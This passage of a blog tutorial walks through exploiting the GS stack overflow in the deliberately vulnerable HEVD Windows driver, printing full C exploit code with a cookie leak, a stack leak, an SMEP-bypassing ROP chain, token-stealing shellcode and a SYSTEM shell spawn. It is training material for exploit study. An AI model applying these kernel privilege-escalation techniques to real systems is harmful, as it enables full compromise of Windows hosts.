\u0026lt;shlwapi.h\u0026gt; /* IOCTL */ #define STACK_OVERFLOW_GS_IOCTL 0x222007 /* Exploit Settings */ #define ALLOCATION_SIZE 0x1000 /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ DWORD GenerateExploitBuffer(LPVOID lpvNt, LPVOID lpvBuffer) { size_t i = 0; uint64_t *payload = (uint64_t *)lpvBuffer; for (i = 0; i \u0026lt; ALLOCATION_SIZE; i += sizeof(uint64_t)) *payload++ = 0x41414141; return i; } /* Exploit(): Stack Overflow (GS) */ int Exploit(HANDLE hHEVD) { DWORD dwExploitBuffer = 0; DWORD dwBytesReturned = 0; LPVOID lpvMemoryAlloc = NULL; lpvMemoryAlloc = VirtualAlloc(NULL, ALLOCATION_SIZE, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvMemoryAlloc == NULL) { printf(\u0026#34;[*] Failed to create exploitation buffer\\n\u0026#34;); return -1; } dwExploitBuffer = GenerateExploitBuffer(NULL, lpvMemoryAlloc); printf(\u0026#34;[*] Exploit buffer size: %d\\n\u0026#34;, dwExploitBuffer); DeviceIoControl(hHEVD, STACK_OVERFLOW_GS_IOCTL, lpvMemoryAlloc, dwExploitBuffer, NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation success!!! Enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Once sent, we get a crash :)\nHowever, taking a closer look at the crash, we can see we have encountered the stack cookie / canary mitigation.\nMitigation Analysis # Looking at the cookie initialization we can see that the __security_cookie is stored within HEVD at HEVD+0x3000 (we can also confirm this in Ghidra). In addition, we can see that the __security_cookie will be XOR\u0026rsquo;d by the value currently stored in RSP. Once complete, the result of the XOR operation is stored into RSP+0x220 essentially an offset into the stack. Without looking at this further we can make the assumption that if we overwrite the value stored at RSP+0x220 we\u0026rsquo;ll trigger the mitigation.\nIf we re-launch the exploit and break at the start of TriggerBufferOverflowStackGS, we can confirm the cookie is stored in HEVD\u0026rsquo;s memory:\nWe further confirm this when we get to the XOR operation. Which as shown below, we can see is simply the current stack address NOT a hardcoded value of some sort.\nIf we step once more, we can see this new value stored in RAX will be placed onto the stack. What if we restored this once corrupted?\nYou may have issues during analysis with such a large buffer, so go ahead and decrease the buffer size to 0x900 bytes. Once done, re-run the experiment above and run !analyze -v. This time our final cookie after the XOR operation is ffff40da07033567 and RSP+0x220 pointed to ffffe58347db76f0, with that we can set a breakpoint at HEVD+0x867b9. At this point if we continue execution we can see we take a jump, if we continued (we won\u0026rsquo;t) we\u0026rsquo;d end up calling the __security_check_cookie() function. If we dump the address where the cookie was stored we can see we have corrupted it. However if we restore it and continue\u0026hellip;\nWe get control over the instruction pointer :)\nThis gives us a solid high-level overview on how we can bypass this mitigation.\nBaking Cookies # So as with other exploits we\u0026rsquo;ve written throughout this HEVD \u0026ldquo;course\u0026rdquo; you may be thinking this would be as simple as getting the base address of HEVD and reading the memory location where the cookie was located. However, quickly (stubbornly) we’d learn this was not the case. We need to find a leak, in our case we could re-use the Write-What-Where / Arbitrary Write vulnerability\u0026hellip;\nLet\u0026rsquo;s write a PoC and test it.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; /* IOCTL */ #define STACK_OVERFLOW_GS_IOCTL 0x222007 #define ARBITRARY_WRITE_IOCTL 0x22200b /* Structure used by Write-What-Where */ typedef struct _WRITE_WHAT_WHERE { uint64_t *ullpWhat; uint64_t *ullpWhere; } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; /* Exploit Settings */ #define ALLOCATION_SIZE 0x900 /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ DWORD GenerateExploitBuffer(LPVOID lpvNt, LPVOID lpvBuffer) { size_t i = 0; uint64_t *payload = (uint64_t *)lpvBuffer; for (i = 0; i \u0026lt; ALLOCATION_SIZE; i += sizeof(uint64_t)) *payload++ = 0x41414141; return i; } /* WriteBytes(): Arbitrary write located in the TriggerArbitraryWrite() function */ void WriteBytes(HANDLE hHEVD, uint64_t* u64What, uint64_t* u64Where) { DWORD dwBytesReturned = 0; WRITE_WHAT_WHERE www = { 0 }; www.ullpWhere = u64Where; www.ullpWhat = u64What; printf(\u0026#34;\\t[*] Writing 0x%p to 0x%p\\n\u0026#34;, www.ullpWhat, www.ullpWhere); DeviceIoControl(hHEVD, ARBITRARY_WRITE_IOCTL, \u0026amp;www, sizeof(WRITE_WHAT_WHERE), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); } /* LeakCookie(): Leverage the ARBITRARY_WRITE_IOCTL to write to our variable in Userland from Kernel Land. */ uint64_t LeakCookie(HANDLE hHEVD, LPVOID lpvHEVD) { uint64_t cookie = 0; uint64_t *pu64Cookie = (uint64_t *)(lpvHEVD + 0x3000); printf(\u0026#34;\\t[*] Cookie located @{0x%p}\\n\u0026#34;, pu64Cookie); WriteBytes(hHEVD, pu64Cookie, \u0026amp;cookie); printf(\u0026#34;\\t[+] Cookie leaked: 0x%p\\n\u0026#34;, cookie); return cookie; } /* Exploit(): Stack Overflow (GS) */ int Exploit(HANDLE hHEVD) { uint64_t cookie = 0x00; DWORD dwExploitBuffer = 0; DWORD dwBytesReturned = 0; LPVOID lpvMemoryAlloc = NULL; LPVOID lpvHEVD = GetKernelModuleBase(\u0026#34;HEVD\u0026#34;); if (lpvHEVD == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of HEVD\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Base address of HEVD @{0x%p}\\n\u0026#34;, lpvHEVD); printf(\u0026#34;[*] Attempting to leak __security_cookie\\n\u0026#34;); cookie = LeakCookie(hHEVD, lpvHEVD); ---snip--- } Once launched, we successfully leaked the stack cookie!\nHowever, we still need to leak the stack\u0026hellip; I was pretty stuck\u0026hellip; until I came across another great post by Kristal-G where the use of a leak from sam-b came in handy.\nLet\u0026rsquo;s once again code this and test it!\nvoid LeakStack(wchar_t *targetPoC) { HMODULE ntdll = GetModuleHandle(TEXT(\u0026#34;ntdll\u0026#34;)); PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, \u0026#34;NtQuerySystemInformation\u0026#34;); if (query == NULL) { printf(\u0026#34;GetProcAddress() failed.\\n\u0026#34;); exit(-1); } ULONG len = 2000; NTSTATUS status = 0x00; PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL; do { len *= 2; pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len); status = query(SystemExtendedProcessInformation, pProcessInfo, len, \u0026amp;len); } while (status == (NTSTATUS)0xc0000004); if (status != (NTSTATUS)0x0) { printf(\u0026#34;NtQuerySystemInformation failed with error code 0x%X\\n\u0026#34;, status); exit(-1); } while (pProcessInfo-\u0026gt;NextEntryOffset != 0x00) { // Strangely I was able to do this with the pProcessInfo-\u0026gt;ImageName.Buffer being NULL? if (StrStrW(pProcessInfo-\u0026gt;ImageName.Buffer, targetPoC) != NULL || pProcessInfo-\u0026gt;ImageName.Buffer == NULL) { printf(\u0026#34;[*] Leaking stack from %ls\\n\u0026#34;, targetPoC); for (unsigned int i = 0; i \u0026lt; pProcessInfo-\u0026gt;NumberOfThreads; i++) { LPVOID stackBase = pProcessInfo-\u0026gt;Threads[i].StackBase; LPVOID stackLimit = pProcessInfo-\u0026gt;Threads[i].StackLimit; #ifdef _WIN64 printf(\u0026#34;\\tStack base 0x%p\\tStack limit 0x%p\\n\u0026#34;, stackBase, stackLimit); #else printf(\u0026#34;\\tStack base 0x%X\\t\u0026#34;, stackBase); printf(\u0026#34;\\tStack limit 0x%X\\r\\n\u0026#34;, stackLimit); #endif break; } } if (!pProcessInfo-\u0026gt;NextEntryOffset) { pProcessInfo = NULL; } else { pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo-\u0026gt;NextEntryOffset); } } } /* Exploit(): Stack Overflow (GS) */ int Exploit(HANDLE hHEVD) { uint64_t cookie = 0x00; DWORD dwExploitBuffer = 0; DWORD dwBytesReturned = 0; LPVOID lpvStackLeak = NULL; LPVOID lpvMemoryAlloc = NULL; LPVOID lpvHEVD = GetKernelModuleBase(\u0026#34;HEVD\u0026#34;); if (lpvHEVD == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of HEVD\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Base address of HEVD @{0x%p}\\n\u0026#34;, lpvHEVD); printf(\u0026#34;[*] Attempting to leak __security_cookie\\n\u0026#34;); cookie = LeakCookie(hHEVD, lpvHEVD); LeakStack(L\u0026#34;poc.exe\u0026#34;); getchar(); ---snip--- } As you can see from our source code, we had a lot of trouble getting the target process. It was strange, basically what we ended up seeing was that the pProcessInfor-\u0026gt;ImageName.Buffer needed to be NULL.\nWe can further confirm this with GDB.\nWith that we should have everything we need to exploit this bug :)\nExploitation # Below is the final PoC code:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;wchar.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; typedef LONG KPRIORITY; typedef struct _CLIENT_ID { DWORD UniqueProcess; DWORD UniqueThread; } CLIENT_ID; typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; #ifdef MIDL_PASS [size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer; #else // MIDL_PASS _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer; #endif // MIDL_PASS } UNICODE_STRING; typedef UNICODE_STRING *PUNICODE_STRING; typedef const UNICODE_STRING *PCUNICODE_STRING; //from http://boinc.berkeley.edu/android-boinc/boinc/lib/diagnostics_win.h typedef struct _VM_COUNTERS { // the following was inferred by painful reverse engineering SIZE_T PeakVirtualSize; // not actually SIZE_T PageFaultCount; SIZE_T PeakWorkingSetSize; SIZE_T WorkingSetSize; SIZE_T QuotaPeakPagedPoolUsage; SIZE_T QuotaPagedPoolUsage; SIZE_T QuotaPeakNonPagedPoolUsage; SIZE_T QuotaNonPagedPoolUsage; SIZE_T PagefileUsage; SIZE_T PeakPagefileUsage; SIZE_T VirtualSize; // not actually } VM_COUNTERS; typedef enum _KWAIT_REASON { Executive = 0, FreePage = 1, PageIn = 2, PoolAllocation = 3, DelayExecution = 4, Suspended = 5, UserRequest = 6, WrExecutive = 7, WrFreePage = 8, WrPageIn = 9, WrPoolAllocation = 10, WrDelayExecution = 11, WrSuspended = 12, WrUserRequest = 13, WrEventPair = 14, WrQueue = 15, WrLpcReceive = 16, WrLpcReply = 17, WrVirtualMemory = 18, WrPageOut = 19, WrRendezvous = 20, Spare2 = 21, Spare3 = 22, Spare4 = 23, Spare5 = 24, WrCalloutStack = 25, WrKernel = 26, WrResource = 27, WrPushLock = 28, WrMutex = 29, WrQuantumEnd = 30, WrDispatchInt = 31, WrPreempted = 32, WrYieldExecution = 33, WrFastMutex = 34, WrGuardedMutex = 35, WrRundown = 36, MaximumWaitReason = 37 } KWAIT_REASON; typedef struct _SYSTEM_THREAD_INFORMATION { LARGE_INTEGER KernelTime; LARGE_INTEGER UserTime; LARGE_INTEGER CreateTime; ULONG WaitTime; PVOID StartAddress; CLIENT_ID ClientId; KPRIORITY Priority; LONG BasePriority; ULONG ContextSwitchCount; ULONG ThreadState; KWAIT_REASON WaitReason; #ifdef _WIN64 ULONG Reserved[4]; #endif } SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION; typedef struct _SYSTEM_EXTENDED_THREAD_INFORMATION { SYSTEM_THREAD_INFORMATION ThreadInfo; PVOID StackBase; PVOID StackLimit; PVOID Win32StartAddress; PVOID TebAddress; /* This is only filled in on Vista and above */ ULONG Reserved1; ULONG Reserved2; ULONG Reserved3; } SYSTEM_EXTENDED_THREAD_INFORMATION, *PSYSTEM_EXTENDED_THREAD_INFORMATION; typedef struct _SYSTEM_EXTENDED_PROCESS_INFORMATION { ULONG NextEntryOffset; ULONG NumberOfThreads; LARGE_INTEGER SpareLi1; LARGE_INTEGER SpareLi2; LARGE_INTEGER SpareLi3; LARGE_INTEGER CreateTime; LARGE_INTEGER UserTime; LARGE_INTEGER KernelTime; UNICODE_STRING ImageName; KPRIORITY BasePriority; ULONG ProcessId; ULONG InheritedFromUniqueProcessId; ULONG HandleCount; ULONG SessionId; PVOID PageDirectoryBase; VM_COUNTERS VirtualMemoryCounters; SIZE_T PrivatePageCount; IO_COUNTERS IoCounters; SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1]; } SYSTEM_EXTENDED_PROCESS_INFORMATION, *PSYSTEM_EXTENDED_PROCESS_INFORMATION; typedef enum _SYSTEM_INFORMATION_CLASS { SystemExtendedProcessInformation = 57 } SYSTEM_INFORMATION_CLASS; typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)( __in SYSTEM_INFORMATION_CLASS SystemInformationClass, __inout PVOID SystemInformation, __in ULONG SystemInformationLength, __out_opt PULONG ReturnLength ); /* IOCTL */ #define STACK_OVERFLOW_GS_IOCTL 0x222007 #define ARBITRARY_WRITE_IOCTL 0x22200b /* Structure used by Write-What-Where */ typedef struct _WRITE_WHAT_WHERE { uint64_t *ullpWhat; uint64_t *ullpWhere; } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; /* Exploit Settings */ #define ALLOCATION_SIZE 0x900 /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ DWORD GenerateExploitBuffer(LPVOID lpvNt, LPVOID lpvStackLeak, uint64_t cookie, LPVOID lpvBuffer) { size_t j = 0; size_t i = 0; LPVOID shellcode = NULL; uint64_t nt = (uint64_t)(lpvNt); uint64_t stack = (uint64_t)(lpvStackLeak); uint64_t *payload = (uint64_t *)(lpvBuffer); uint8_t sc[129] = { // sickle-tool -p windows/x64/kernel_token_stealer -f num (58 bytes) 0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0xb2, 0x04, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x2d, 0x48, 0x04, 0x00, 0x00, 0x38, 0x90, 0x40, 0x04, 0x00, 0x00, 0x75, 0xeb, 0x48, 0x8b, 0x90, 0xb8, 0x04, 0x00, 0x00, 0x48, 0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, // sickle-tool -p windows/x64/kernel_sysret -f num (71) 0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07 }; shellcode = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (shellcode == NULL) { printf(\u0026#34;[-] Failed to allocate memory for shellcode\\n\u0026#34;); return -1; } RtlCopyMemory(shellcode, sc, 129); /* Adjust the stack pointer */ stack -= 0xb30; printf(\u0026#34;\\t[*] Writing stack cookie @{0x%p}\\n\u0026#34;, stack); /* Overflow past the size of the buffer */ for (i = 0; i \u0026lt; (512 / sizeof(uint64_t)); i++) { payload[i] = 0x4141414141414141; } payload[i++] = (stack ^ cookie); /* Stack Cookie */ /* Offset to shellcode start */ payload[i++] = 0x4343434343434343; payload[i++] = 0x4444444444444444; payload[i++] = 0x4545454545454545; payload[i++] = 0x4646464646464646; payload[i++] = 0x4747474747474747; payload[i++] = 0x4848484848484848; /* Prepare RDX register for later. This is needed for the XOR operation */ payload[i++] = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret payload[i++] = 0x000008; // Set RDX to 0x08, we will need this to accomplish the XOR payload[i++] = 0x000000; // [filler] payload[i++] = 0x000000; // [filler] /* Setup the call to MiGetPteAddress in order to get the address of the PTE for our userland code. The setup is as follows: RAX -\u0026gt; VOID *MiGetPteAddress( ( RCX == PTE / Userland Code ) ); Once the call is complete RAX should contain the pointer to our PTE. */ payload[i++] = nt + 0x57699c; // pop rcx ; ret payload[i++] = (uint64_t)shellcode; // *shellcode payload[i++] = nt + 0x24aaec; // MiGetPteAddress() /* Now that we have obtained the PTE address, we can modify the 2nd bit in order to mark the page as a kernel page (U -\u0026gt; K). We can do this using XOR ;) */ payload[i++] = nt + 0x30fcf3; // sub rax, rdx ; ret payload[i++] = nt + 0x54f344; // push rax ; pop rbx ; ret payload[i++] = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret payload[i++] = 0x000004; // 0x40ed4e: pop rdx ; pop rax ; pop rcx ; ret ; (1 found) payload[i++] = 0x000000; // [filler] payload[i++] = 0x000000; // [filler] payload[i++] = nt + 0x3788b6; // xor [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret /* Now we cam spray our shellcode address since SMEP and VPS should be bypassed */ for (j = 0; j \u0026lt; 0xC; j++) { payload[i++] = (uint64_t)shellcode; } printf(\u0026#34;\\t[*] Generated %d bytes ...\\n\u0026#34;, (i * sizeof(uint64_t))); return (i * sizeof(uint64_t)); } /* WriteBytes(): Arbitrary write located in the TriggerArbitraryWrite() function */ void WriteBytes(HANDLE hHEVD, uint64_t* u64What, uint64_t* u64Where) { DWORD dwBytesReturned = 0; WRITE_WHAT_WHERE www = { 0 }; www.ullpWhere = u64Where; www.ullpWhat = u64What; printf(\u0026#34;\\t[*] Writing 0x%p to 0x%p\\n\u0026#34;, www.ullpWhat, www.ullpWhere); DeviceIoControl(hHEVD, ARBITRARY_WRITE_IOCTL, \u0026amp;www, sizeof(WRITE_WHAT_WHERE), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); } /* LeakCookie(): Leverage the ARBITRARY_WRITE_IOCTL to write to our variable in Userland from Kernel Land. */ uint64_t LeakCookie(HANDLE hHEVD, LPVOID lpvHEVD) { uint64_t cookie = 0; uint64_t *pu64Cookie = (uint64_t *)(lpvHEVD + 0x3000); printf(\u0026#34;\\t[*] Cookie located @{0x%p}\\n\u0026#34;, pu64Cookie); WriteBytes(hHEVD, pu64Cookie, \u0026amp;cookie); printf(\u0026#34;\\t[+] Cookie leaked: 0x%p\\n\u0026#34;, cookie); return cookie; } void LeakStack(wchar_t *targetPoC, LPVOID *lpvStackLeak) { HMODULE ntdll = GetModuleHandle(TEXT(\u0026#34;ntdll\u0026#34;)); PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, \u0026#34;NtQuerySystemInformation\u0026#34;); if (query == NULL) { printf(\u0026#34;GetProcAddress() failed.\\n\u0026#34;); exit(-1); } ULONG len = 2000; NTSTATUS status = 0x00; PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL; do { len *= 2; pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len); status = query(SystemExtendedProcessInformation, pProcessInfo, len, \u0026amp;len); } while (status == (NTSTATUS)0xc0000004); if (status != (NTSTATUS)0x0) { printf(\u0026#34;NtQuerySystemInformation failed with error code 0x%X\\n\u0026#34;, status); exit(-1); } LPVOID stackBase = NULL; LPVOID stackLimit = NULL; while (pProcessInfo-\u0026gt;NextEntryOffset != 0x00) { // Strangely I was able to do this with the pProcessInfo-\u0026gt;ImageName.Buffer being NULL? if (StrStrW(pProcessInfo-\u0026gt;ImageName.Buffer, targetPoC) != NULL) { printf(\u0026#34;[*] Leaking stack from %ls\\n\u0026#34;, targetPoC); for (unsigned int i = 0; i \u0026lt; pProcessInfo-\u0026gt;NumberOfThreads; i++) { stackBase = pProcessInfo-\u0026gt;Threads[i].StackBase; stackLimit = pProcessInfo-\u0026gt;Threads[i].StackLimit; #ifdef _WIN64 printf(\u0026#34;\\t[*] Stack base 0x%p\\tStack limit 0x%p\\n\u0026#34;, stackBase, stackLimit); #else printf(\u0026#34;\\t[*] Stack base 0x%X\\tStack limit 0x%X\\n\u0026#34;, stackBase, stackLimit); #endif break; } } if (!pProcessInfo-\u0026gt;NextEntryOffset) { pProcessInfo = NULL; } else { pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo-\u0026gt;NextEntryOffset); } } *lpvStackLeak = stackBase; } /* Exploit(): Stack Overflow (GS) */ int Exploit(HANDLE hHEVD) { uint64_t cookie = 0x00; DWORD dwExploitBuffer = 0; DWORD dwBytesReturned = 0; LPVOID lpvStackLeak = NULL; LPVOID lpvMemoryAlloc = NULL; LPVOID lpvHEVD = GetKernelModuleBase(\u0026#34;HEVD\u0026#34;); LPVOID lpvNtKrnl = GetKernelModuleBase(\u0026#34;ntoskrnl\u0026#34;); if (lpvHEVD == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of HEVD\\n\u0026#34;); return -1; } if (lpvNtKrnl == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of ntoskrnl\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Exploitation started....\\n\u0026#34;); printf(\u0026#34;[*] Base address of HEVD @{0x%p}\\n\u0026#34;, lpvHEVD); printf(\u0026#34;[*] Base address of NT @{0x%p}\\n\u0026#34;, lpvNtKrnl); printf(\u0026#34;[*] Attempting to leak __security_cookie\\n\u0026#34;); cookie = LeakCookie(hHEVD, lpvHEVD); if (cookie == 0x00) { printf(\u0026#34;[-] Failed to leak stack cookie\\n\u0026#34;); } /* I found I need to hammer the stack leak to get it to work :| */ while (1) { LeakStack(L\u0026#34;poc.exe\u0026#34;, \u0026amp;lpvStackLeak); if (lpvStackLeak != NULL) { break; } } if (lpvStackLeak == NULL) { printf(\u0026#34;[-] Failed to leak stack address\\n\u0026#34;); return -1; } lpvMemoryAlloc = VirtualAlloc(NULL, ALLOCATION_SIZE, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvMemoryAlloc == NULL) { printf(\u0026#34;[*] Failed to create exploitation buffer\\n\u0026#34;); return -1; } dwExploitBuffer = GenerateExploitBuffer(lpvNtKrnl, lpvStackLeak, cookie, lpvMemoryAlloc); printf(\u0026#34;[*] Sending payload!!!\\n\u0026#34;, dwExploitBuffer); DeviceIoControl(hHEVD, STACK_OVERFLOW_GS_IOCTL, lpvMemoryAlloc, dwExploitBuffer, NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation success!!! Enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Once sent we, we get our privileged shell!\nSources # https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html https://github.com/sam-b/windows_kernel_address_leaks/tree/3810bec445c0afaa4e23338241ba0359aea398d1 ","date":"8 February 2025","externalUrl":null,"permalink":"/posts/0x09-return-of-the-stack-overflow/","section":"Posts","summary":"","title":"0x09 - Return of the Windows Kernel Stack 